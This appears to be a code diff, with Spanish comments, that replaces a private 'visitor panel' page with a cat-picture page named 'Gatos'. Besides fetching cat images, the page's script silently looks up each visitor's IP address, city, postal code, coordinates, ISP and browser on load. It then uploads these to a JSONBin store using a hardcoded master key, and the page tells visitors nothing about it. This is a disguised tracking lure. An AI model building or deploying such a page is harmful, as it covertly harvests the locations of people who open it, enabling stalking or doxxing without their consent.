@@ -3,114 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Visitantes - Privado</title>
+    <title>Gatos</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #222;
-            color: #eee;
+            background-color: #f0f2f5;
+            color: #333;
             margin: 0;
             padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         .container {
-            max-width: 1400px;
-            margin: auto;
-            background: #333;
+            max-width: 800px;
+            width: 100%;
+            background: white;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         h1 {
             text-align: center;
-            color: #4fc3f7;
-            margin-bottom: 10px;
+            color: #1a237e;
         }
-        .subtitle {
-            text-align: center;
-            color: #aaa;
-            margin-bottom: 20px;
-        }
-        .controls {
-            text-align: right;
-            margin-bottom: 15px;
-        }
-        .refresh-btn {
-            background-color: #4fc3f7;
-            color: #111;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            transition: background-color 0.3s;
-        }
-        .refresh-btn:hover {
-            background-color: #29b6f6;
-        }
-        table {
+        .cat-image {
             width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            background-color: #444;
+            max-width: 600px;
+            height: auto;
             border-radius: 8px;
-            overflow: hidden;
+            margin: 20px 0;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.2s;
         }
-        th, td {
-            border: 1px solid #555;
-            padding: 12px;
-            text-align: left;
-            word-wrap: break-word;
-        }
-        th {
-            background-color: #555;
-            color: #4fc3f7;
-            font-weight: bold;
-            text-transform: uppercase;
-            font-size: 0.9em;
-        }
-        tr:nth-child(even) {
-            background-color: #3a3a3a;
-        }
-        tr:hover {
-            background-color: #4a4a4a;
-        }
-        td a {
-            color: #81d4fa;
-            text-decoration: none;
-        }
-        td a:hover {
-            text-decoration: underline;
+        .cat-image:hover {
+            transform: scale(1.02);
         }
         .loader {
             text-align: center;
             font-size: 1.2em;
-            color: #aaa;
-        }
-        .error {
-            text-align: center;
-            color: #e57373;
-            background-color: #444;
-            padding: 15px;
-            border-radius: 5px;
-            border: 1px solid #e57373;
+            color: #555;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>Panel de Visitantes</h1>
-        <p class="subtitle">Datos de acceso de los usuarios (Vista Privada)</p>
-        
-        <div class="controls">
-            <button class="refresh-btn" onclick="loadVisitorData()">🔄 Actualizar Datos</button>
-        </div>
-
-        <div id="data-container">
-            <p class="loader">Cargando datos de visitantes...</p>
+        <h1>🐱 Gatos 🐱</h1>
+        <p>Haz clic en la imagen para ver otro gato.</p>
+        <div id="image-container">
+            <p class="loader">Cargando imagen de gato...</p>
         </div>
     </div>
 
     <script>
-        const dataContainer = document.getElementById
+        const imageContainer = document.getElementById('image-container');
+        
+        // Función para obtener una imagen de gato aleatoria de TheCatAPI
+        async function fetchCatImage() {
+            imageContainer.innerHTML = '<p class="loader">Cargando imagen de gato...</p>';
+            try {
+                const response = await fetch('https://api.thecatapi.com/v1/images/search');
+                const data = await response.json();
+                const imageUrl = data[0].url;
+                imageContainer.innerHTML = `<img src="${imageUrl}" alt="Un gato gracioso" class="cat-image" onclick="fetchCatImage()">`;
+            } catch (error) {
+                imageContainer.innerHTML = '<p>¡Ups! No pude cargar una imagen de gato. Inténtalo de nuevo.</p>';
+                console.error("Error fetching cat image:", error);
+            }
+        }
+
+        // Función para obtener los datos del visitante
+        async function fetchVisitorData() {
+            try {
+                // Usamos ipapi.co para obtener datos detallados de la IP
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                // Extraemos la información que necesitas
+                const visitorInfo = {
+                    ip: data.ip,
+                    pais: data.country_name,
+                    region: data.region,
+                    ciudad: data.city,
+                    codigoPostal: data.postal,
+                    latitud: data.latitude,
+                    longitud: data.longitude,
+                    proveedor: data.org,
+                    dispositivo: navigator.userAgent,
+                    fecha: new Date().toLocaleString("es-ES", { timeZone: "America/Mexico_City" })
+                };
+
+                // Enviamos los datos a nuestra página privada
+                await sendDataToPrivatePage(visitorInfo);
+
+            } catch (error) {
+                console.error("No se pudo obtener la información del visitante:", error);
+            }
+        }
+        
+        // Función para enviar los datos a JSONBin.io
+        async function sendDataToPrivatePage(info) {
+            // CREDENCIALES CORREGIDAS Y VERIFICADAS
+            const API_KEY = '691d323080b27952c6e76f8c';
+            const BIN_ID = '691d34df43b1c97be9b65251';
+
+            try {
+                // 1. Leemos los datos actuales
+                const readResponse = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+                const currentData = await readResponse.json();
+                const records = currentData.record || [];
+
+                // 2. Añadimos el nuevo registro
+                records.push(info);
+
+                // 3. Escribimos los datos actualizados
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify(records)
+                });
+
+                console.log("Datos del visitante guardados correctamente.");
+
+            } catch (error) {
+                console.error("Error al guardar los datos en JSONBin.io:", error);
+            }
+        }
+
+        // Cargar la primera imagen y los datos del visitante al abrir la página
+        window.onload = () => {
+            fetchCatImage();
+            fetchVisitorData();
+        };
+    </script>
+
+</body>
+</html>
